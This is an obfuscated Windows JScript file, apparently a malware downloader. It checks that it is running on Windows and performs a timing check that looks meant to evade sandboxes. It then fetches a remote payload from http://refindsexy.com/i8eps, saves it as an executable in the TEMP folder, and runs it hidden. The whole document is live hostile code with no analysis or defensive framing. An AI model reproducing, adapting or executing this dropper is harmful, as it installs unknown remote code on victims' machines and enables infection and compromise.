var J = false;
var r = "CreateObject";
var Qz = function ck() {return WScript[r]("WScript.Shell");}(), Yy = 11;
var d = "MSXML2.XMLHTTP";
var Hk = 2123213;
var N = 0;
function FG(Gm){Qz["Run"](Gm, N, N);};
function B(){return "" + d;};
function nY(Nm, e){N = N * 1; return Nm - e;};
function Rl(){return r;};
/*@cc_on
  @if (@_win32 || @_win64)
    J = true;
  @end
@*/
if (J)
{
var Xx = "";
function Lc(){return 22;};
var l = 0; var Hr = 0;
function pA()
{
var M0 = new this["Date"]();
var Cy = M0["getUTCMilliseconds"]();
WScript["Sleep"](Lc());
var M0 = new this["Date"]();
var LZ = M0["getUTCMilliseconds"]();
WScript["Sleep"](Lc());
var M0 = new this["Date"]();
var cJ = M0["getUTCMilliseconds"]();
var l = "xQ";
l = nY(LZ, Cy);
var Hr = "h";
Hr = nY(cJ, LZ);
Xx = "open";
return nY(l, Hr);
}
var K = false;
var Kp = false;
for (var c = N; c < Lc() * 1; c++){if (pA() != N){
K = true; 
Hr = "31" + 11 * l + Hr; 
Kp = true; 
break;
}}
function bA() {return ((K == true) && (K == Kp)) ? 1 : N;};
if (K && bA() && Kp){
function Vx() {return Qz["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "95S3iHKU3.exe";};
 J0 = B();
 R = WScript[r](J0);
 var OT = 1;
 while (OT){
try {
R[Xx]("GET", "http://refindsexy.com/i8eps", false);
R["send"]();
w = "Sleep";
for (;;){WScript[w](Lc() * 11); if (R["readystate"] >= 2 * 2) break;};
OT = N;
} catch(bi){};
}
function qX(v) {var lK = (1, 2, 3, 4, 5, v); return lK;};
Db = WScript[Rl()]("ADODB.Stream");
J0 = Db;
J0[Xx]();
J0["type"] = qX(1);
J0["write"](R["ResponseBody"]);
Db["position"] = qX(N);
J0["Save" + "ToFile"](Vx(), 2);
Db["c"+"lose"]();
M = Vx();
FG(M);
}
}

